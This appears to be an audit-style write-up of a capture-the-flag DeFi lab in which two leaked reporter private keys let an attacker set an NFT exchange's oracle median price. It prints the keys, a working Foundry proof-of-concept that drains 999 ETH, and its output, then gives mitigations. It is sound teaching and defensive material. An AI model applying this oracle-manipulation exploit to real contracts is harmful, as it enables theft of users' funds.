## High

### [H-1] Two leaked reporter keys let an attacker set the oracle price and drain the whole exchange

**Description:**

The exchange does not know a real price on its own. It asks the oracle, and the oracle price is just the **median** of what the trusted reporters say. There are 3 reporters, so the median is the **middle** of their 3 numbers.

```solidity
// src/compromised/Exchange.sol:36 and :59
uint256 price = oracle.getMedianPrice(token.symbol());
```

```solidity
// src/compromised/TrustfulOracle.sol:55-57
function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
    _setPrice(msg.sender, symbol, newPrice);
}
```

A reporter can set their own price to **any** value, high or low. There is no limit and no check.

The challenge leaks two private keys in a server response. Those two keys belong to two of the three reporters:

```
0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744  ->  0x188Ea627E3531Db590e6f1D71ED83628d1933088
0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159  ->  0xA417D473c40a4d42BAd35f147c21eEa7973539D8
```

With 2 of 3 reporters you own the median. If you set both of your prices to the same number, that number is always the middle one:

Set both to 0, prices are `[0, 0, 999]`, median is **0**, Set both very high, prices are `[999, high, high]`, median is **high**.

So the whole price is in your hands, and the exchange trusts it fully for both buy and sell. That lets you buy for nothing and sell for everything.

Location `src/compromised/TrustfulOracle.sol:55-57` and `src/compromised/Exchange.sol:36`, `:59`.

**Impact:**

Likelihood High. The keys are handed out in the leak, and posting a price needs nothing else.

Risk High. The full exchange balance, 999 ETH, is drained.

**Proof of Concept:**

Drop the price to 0 with the two stolen reporters, buy one NFT for almost nothing, pump the price up to the whole exchange balance, sell the NFT back to drain it, then send the ETH to recovery. There is no need to put the price back by hand. The sell price is the whole balance, 999 ETH, which is also the starting price, so the median is already back to normal after the sale.

```solidity
function test_compromisedExploit() public {
    // the leaked keys belong to two of the three reporters
    address source1 = vm.addr(LEAKED_KEY_1);
    address source2 = vm.addr(LEAKED_KEY_2);

    console.log("leaked source 1  :", source1);
    console.log("leaked source 2  :", source2);
    console.log("BEFORE ATTACK");
    console.log("exchange balance :", address(exchange).balance);
    console.log("player balance   :", player.balance);
    console.log("recovery balance :", recovery.balance);
    console.log("median price     :", oracle.getMedianPrice("DVNFT"));

    // 1. drop the price to 0 with the two stolen reporters
    vm.prank(source1);
    oracle.postPrice("DVNFT", 0);
    vm.prank(source2);
    oracle.postPrice("DVNFT", 0);
    console.log("price after drop :", oracle.getMedianPrice("DVNFT"));

    // 2. player buys one NFT for almost nothing
    vm.prank(player);
    uint256 id = exchange.buyOne{value: 1}();
    console.log("bought nft id    :", id);

    // 3. pump the price up to the whole exchange balance
    uint256 drainPrice = address(exchange).balance;
    vm.prank(source1);
    oracle.postPrice("DVNFT", drainPrice);
    vm.prank(source2);
    oracle.postPrice("DVNFT", drainPrice);
    console.log("price after pump :", oracle.getMedianPrice("DVNFT"));

    // 4. player sells the NFT back and drains the exchange.
    vm.startPrank(player);
    nft.approve(address(exchange), id);
    exchange.sellOne(id);
    vm.stopPrank();

    // 5. send the stolen ETH to the recovery account
    vm.prank(player);
    payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);

    console.log("AFTER ATTACK");
    console.log("exchange balance :", address(exchange).balance);
    console.log("player balance   :", player.balance);
    console.log("recovery balance :", recovery.balance);
    console.log("median price     :", oracle.getMedianPrice("DVNFT"));

    assertEq(address(exchange).balance, 0, "exchange not empty");
    assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE, "recovery did not get the eth");
    assertEq(nft.balanceOf(player), 0, "player still owns an nft");
    assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE, "price not restored");
}
```

Run `forge test --match-path test/compromised/CompromisedPoC.t.sol -vv`:

```
Ran 1 test for test/compromised/CompromisedPoC.t.sol:CompromisedPoC
[PASS] test_compromisedExploit() (gas: 263207)
Logs:
  leaked source 1  : 0x188Ea627E3531Db590e6f1D71ED83628d1933088
  leaked source 2  : 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
  BEFORE ATTACK
  exchange balance : 999000000000000000000
  player balance   : 100000000000000000
  recovery balance : 0
  median price     : 999000000000000000000
  price after drop : 0
  bought nft id    : 0
  price after pump : 999000000000000000000
  AFTER ATTACK
  exchange balance : 0
  player balance   : 100000000000000000
  recovery balance : 999000000000000000000
  median price     : 999000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

The exchange goes from 999 ETH to 0, and recovery ends with all 999 ETH. The final median is still 999 ETH on its own, because the pump price that drains the pool is the same as the starting price.

**Recommended Mitigation:**

The direct cause is leaked keys, so first rotate the two reporter keys and remove the old ones. But the design is weak on its own and should be fixed too:

1 Use many independent reporters, not 3, so a couple of bad ones can not swing the median.
2 Add sanity limits. Reject a new price that jumps too far from the last one, and reject 0.
3 Give each price a timestamp so the oracle can drop stale prices.
4 Read from a proven price source like Chainlink instead of a small trusted list.

***

## Low

### [L-1] `MIN_SOURCES = 1` and a tiny reporter set make the median easy to control

**Description:**

The oracle allows as few as one source, and it trusts the plain median of a very small set.

```solidity
// src/compromised/TrustfulOracle.sol:13
uint256 public constant MIN_SOURCES = 1;
```

With one source the "median" is just that one price, so a single account is the whole truth. Even with three, holding two of them is enough to own the median.

Location `src/compromised/TrustfulOracle.sol:13`.

**Impact:**

Likelihood Low. Risk Medium if a few sources go bad.

**Proof of Concept:**

N/A

**Recommended Mitigation:**

Require a larger minimum, and use enough independent sources that no small group controls the middle value.

```diff
- uint256 public constant MIN_SOURCES = 1;
+ uint256 public constant MIN_SOURCES = 5;
```
